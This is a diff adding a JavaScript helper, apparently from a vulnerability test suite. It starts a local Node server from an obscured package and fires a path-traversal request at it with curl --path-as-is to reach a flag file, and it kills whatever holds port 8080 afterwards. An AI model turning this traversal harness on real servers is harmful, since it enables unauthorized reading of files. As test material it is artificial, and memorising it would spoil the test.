@@ -1,0 +1,38 @@
+function exploitFunction() {
+    const path = require("path");  // Ensure path module is required
+    const { sleep } = require("sleep");
+    const pathToFlag = path.resolve(__dirname, "../flag.html");
+
+    afterAll(() => {
+        try {
+            execSync("fuser -k 8080/tcp");
+        } catch (e) {}
+    });
+
+    const serverCommand = "node ./node_modules/exxxxxxxxxxx/index.js";
+
+    // Start the server
+    const serverProcess = exec(serverCommand, (error, stdout) => {
+        sleep.sleep(2);
+
+        // Generate the attack string
+        const attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${getPayload()}"`;
+
+        // Execute the attack
+        exec(attack_string, (error, stdout) => {
+            if (error) {
+                console.error(`Error executing attack: ${error}`);
+                return;
+            }
+            return stdout;
+        });
+    });
+
+    return new Promise((resolve) => {
+        serverProcess.stdout.on("data", (data) => {
+            resolve(data.toString());
+        });
+    });
+}
+
+module.exports = { exploitFunction };
